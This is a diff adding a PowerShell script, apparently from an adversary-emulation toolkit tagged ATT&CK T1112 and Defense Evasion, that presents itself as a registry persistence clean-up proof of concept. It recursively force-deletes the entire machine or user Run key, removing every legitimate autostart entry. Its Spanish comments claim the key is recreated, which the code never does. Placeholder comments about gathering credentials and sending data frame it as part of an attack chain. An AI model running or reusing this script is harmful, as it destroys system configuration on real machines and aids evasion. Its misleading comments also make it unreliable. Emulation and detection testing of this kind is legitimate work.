@@ -1,0 +1,60 @@
+
+#Title: invoke-registryrunClean
+#Technique: T1112
+#Tactic: TA0005
+function invoke-registryrunClean
+    {
+    <#
+    .SYNOPSIS
+    clean value on registry persistence PoC.
+    .DESCRIPTION
+    Attack Commands: Run with command_prompt! Elevation is not Required (e.g. root or admin)
+    .LINK
+   
+    #>
+   
+    $good = $false
+    $results = $null
+
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+      {
+      if (Test-Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run")
+        {
+        #la ruta existe asi que procedemos a borrarla y la creamos de nuevo.
+        $results = Remove-Item "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Recurse -Force             
+        $good = $true
+        } 
+      }  
+    else 
+      {
+      if (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run")
+        {
+        #la ruta existe asi que procedemos a borrarla y la creamos de nuevo.
+        Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Recurse -Force
+        Start-Sleep 1       
+        $results = "Clean registry successfully"
+        $good = $true       
+        }        
+      }
+    #Return results
+    return @{results = $results | Out-String; success = $good }
+    }
+
+#Main program
+$execute = {
+ 
+}
+#GiveMeData if needed
+#get-credentials
+$execute = invoke-registryrunClean
+#PutData if needed
+  # if($execute.success)
+  # {
+   
+  # }
+ 
+return @{results=$execute.results;success=$execute.success}
+
+
